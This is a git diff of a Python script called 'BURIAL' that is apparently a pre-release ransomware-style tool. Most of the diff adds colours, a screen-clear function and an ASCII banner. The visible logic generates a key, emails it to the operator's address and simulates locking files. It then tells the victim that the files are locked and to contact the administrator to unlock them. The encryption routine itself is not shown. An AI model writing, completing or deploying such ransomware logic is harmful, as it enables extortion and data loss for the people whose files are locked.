@@ -1,11 +1,16 @@
 #this is our first version of the BURIAL project. Please keep in mind of bugs, errors and note that there might be risks in decrypting your files.
 #please also note that some set-up is required. Full guide will be available soon.
 #file is still undergoing progress. Do not try to use this as errors may occur.
+
 import time
 import sys
+import os
 
+GREEN =  "\033[32m"
 YELLOW = "\033[33m"
 RESET = "\033[0m"
+UNDERLINE = "\033[4m"
+BOLD = "\033[1m"
 
 print(f"[+] Do not use the program yet! We are currently under developement.")
 time.sleep(2)
@@ -33,12 +38,37 @@ if continue_tool != 'y':
 # If the user agrees to continue, start the tool
 print("[+] Starting the tool...")
 time.sleep(1.9)
-# Add your tool's functionality here
+#
 
-print("===============================================================================================")
+def clear_screen():
+    """Clear the terminal screen."""
+    if sys.platform == 'win32':
+        os.system('cls')  # For Windows
+    else:
+        os.system('clear')  # For Unix-like systems (Linux, macOS)
+
+clear_screen()
+
+print("============================================================================================================================")
+print("                                                                   ")
+print("                                                                   ")
+print(f"{GREEN}                                                  _                       ")
+print(f"{GREEN}         ______                ______     |_|    ____              ")
+print(f"{GREEN}        |      \\  |       |   /      \\     _    /    \\   |         ")
+print(f"{GREEN}               |      |  |       |  |        |   | |  |      |  |         ")
+print(f"{GREEN}               |_____/   |       |  |_______/    | |  |______|  |         ")
+print(f"{GREEN}               |     \\   |       |  |       \\    | |  |      |  |         ")
+print(f"{GREEN}               |      \\  |       |  |        \\   | |  |      |  |         ")
+print(f"{GREEN}               |      |  |       |  |        |   | |  |      |  |         ")
+print(f"{GREEN}               |______/   \\______/  |        |   |_|  |      |  |______   ")
+print(f"{GREEN}                                                                  ")
+print(f"{YELLOW}                                                {UNDERLINE}v.1.0.  -  pre-release{RESET}")
+print(f"{YELLOW}                                                {UNDERLINE}made by TheUntracable{RESET}")
+time.sleep(7)
+print("         ")
 time.sleep(0.6)
-print(f" -- [+] \033[4mSTARTING UP MACHINE --- v.1.0\033[0m [+] -- ")
-time.sleep(3)
+print(f"              -- [+] \033[4mSTARTING UP MACHINE   -   v.1.0 pre-release\033[0m [+] -- ")
+time.sleep(5)
 
 
 sequence = ["\\", "-", "/", "|", "\\", "-", "/", "|"]
@@ -128,9 +158,9 @@ def main():
     time.sleep(2.5)
     print(f"{GREEN}[+] Key generated.{RESET}")
     # Send the key to your email
-    sender_email = "example.email.com"  # Replace with your email
-    sender_password = "Example.password"  # Replace with your email password (16 characters)
-    recipient_email = "example.email.com"  # Replace with your email
+    sender_email = "your-email@gmail.com"  # Replace with your email
+    sender_password = "xxxx xxxx xxxx"  # Replace with your email password (16 characters)
+    recipient_email = "your-email@gmail.com"  # Replace with your email
     send_key_via_email(key, recipient_email, sender_email, sender_password)
 
     # Simulates locking files
@@ -145,5 +175,9 @@ def main():
     print(f"{GREEN}[+] Your files have been succesfully locked. Contact the administrator to unlock them.{RESET}")
     print("===============================================================================================")
     print(f"{YELLOW}[+] If you wish to contact the administrator, run the 'contact_administrator.py file.{RESET}")
+    print(f"{YELLOW}[+] !important! DO NOT FORGET TO RUN {UNDERLINE}'reset.py'{RESET}{YELLOW} BEFORE RUNNING THIS TOOL AGAIN!!!{RESET}")
+    print("             ")
+    print("             ")
+    print("             ")
 if __name__ == "__main__":
     main()
